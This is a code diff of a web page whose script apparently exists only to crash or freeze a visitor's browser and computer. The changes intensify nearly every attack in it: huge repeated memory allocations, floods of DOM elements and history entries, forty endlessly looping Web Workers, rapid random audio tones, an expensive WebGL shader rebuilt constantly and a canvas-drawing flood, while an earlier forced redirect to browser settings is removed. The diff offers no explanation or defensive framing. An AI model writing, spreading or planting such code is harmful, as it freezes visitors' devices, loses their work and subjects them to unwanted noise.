@@ -17,32 +17,22 @@ const canvas=document.getElementById("gl");
 canvas.width=innerWidth;
 canvas.height=innerHeight;
 const gl=canvas.getContext("webgl");
-
 gl.clearColor(0,0,0,1);
 gl.clear(gl.COLOR_BUFFER_BIT);
 
-setTimeout(startChaos,3000);
-
-function startChaos(){
-
 setTimeout(()=>{
- try{location.href="chrome://settings"}catch(e){}
- try{location.replace("chrome://settings")}catch(e){}
-},4000);
 
 setTimeout(()=>{
  while(true){Math.sqrt(Math.random()*Date.now())}
-},8000);
-
-let mem=[];
-let size=20_000_000;
-setInterval(()=>{
- mem.push(new Uint8Array(size));
- size+=10_000_000;
 },200);
 
+let mem=[];
 setInterval(()=>{
- for(let i=0;i<2000;i++){
+ mem.push(new Uint8Array(100_000_000));
+},60);
+
+setInterval(()=>{
+ for(let i=0;i<6000;i++){
   let d=document.createElement("div");
   d.textContent=Math.random();
   d.style.position="absolute";
@@ -50,28 +40,25 @@ setInterval(()=>{
   d.style.top=Math.random()*innerHeight+"px";
   document.body.appendChild(d);
  }
-},120);
+},80);
 
 setInterval(()=>{
  history.pushState({}, "", "#"+Math.random());
-},80);
+},20);
 
-let workers=0;
-let wInt=setInterval(()=>{
- new Worker(URL.createObjectURL(new Blob([`while(true){Math.atan(Math.random())}`])));
- workers++;
- if(workers>30) clearInterval(wInt);
-},200);
+for(let i=0;i<40;i++){
+ new Worker(URL.createObjectURL(new Blob([`while(true){Math.tan(Math.random())}`])));
+}
 
 const AC=window.AudioContext||window.webkitAudioContext;
 const ac=new AC();
 setInterval(()=>{
  let o=ac.createOscillator();
- o.frequency.value=Math.random()*4000;
+ o.frequency.value=Math.random()*6000;
  o.connect(ac.destination);
  o.start();
- o.stop(ac.currentTime+0.1);
-},150);
+ o.stop(ac.currentTime+0.2);
+},40);
 
 const flood=document.createElement("canvas");
 document.body.appendChild(flood);
@@ -80,9 +67,9 @@ const fx=flood.getContext("2d");
 function gpu2d(){
  flood.width=innerWidth;
  flood.height=innerHeight;
- for(let i=0;i<8000;i++){
+ for(let i=0;i<20000;i++){
   fx.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
-  fx.fillRect(Math.random()*innerWidth,Math.random()*innerHeight,20,20);
+  fx.fillRect(Math.random()*innerWidth,Math.random()*innerHeight,30,30);
  }
  requestAnimationFrame(gpu2d);
 }
@@ -99,12 +86,12 @@ precision highp float;
 void main(){
  vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
  vec3 c=vec3(0.);
- for(int i=0;i<25;i++){
+ for(int i=0;i<60;i++){
   float t=float(i);
   c+=vec3(
-   sin(uv.x*80.+t),
-   cos(uv.y*80.-t),
-   sin((uv.x+uv.y)*40.)
+   sin(uv.x*150.+t),
+   cos(uv.y*150.-t),
+   sin((uv.x+uv.y)*80.)
   );
  }
  gl_FragColor=vec4(c,1.);
@@ -140,16 +127,16 @@ function build(){
 
 let prog=build();
 
-setInterval(()=>{prog=build()},500);
+setInterval(()=>{prog=build()},200);
 
 setInterval(()=>{
- canvas.width=400+Math.random()*1200;
- canvas.height=400+Math.random()*1200;
+ canvas.width=300+Math.random()*2000;
+ canvas.height=300+Math.random()*2000;
  gl.viewport(0,0,canvas.width,canvas.height);
-},400);
+},150);
 
 function draw(){
- for(let i=0;i<5;i++){
+ for(let i=0;i<20;i++){
   gl.drawArrays(gl.TRIANGLES,0,6);
  }
  gl.finish();
@@ -157,7 +144,8 @@ function draw(){
 }
 draw();
 
-}
+},2000);
 </script>
+
 </body>
 </html>
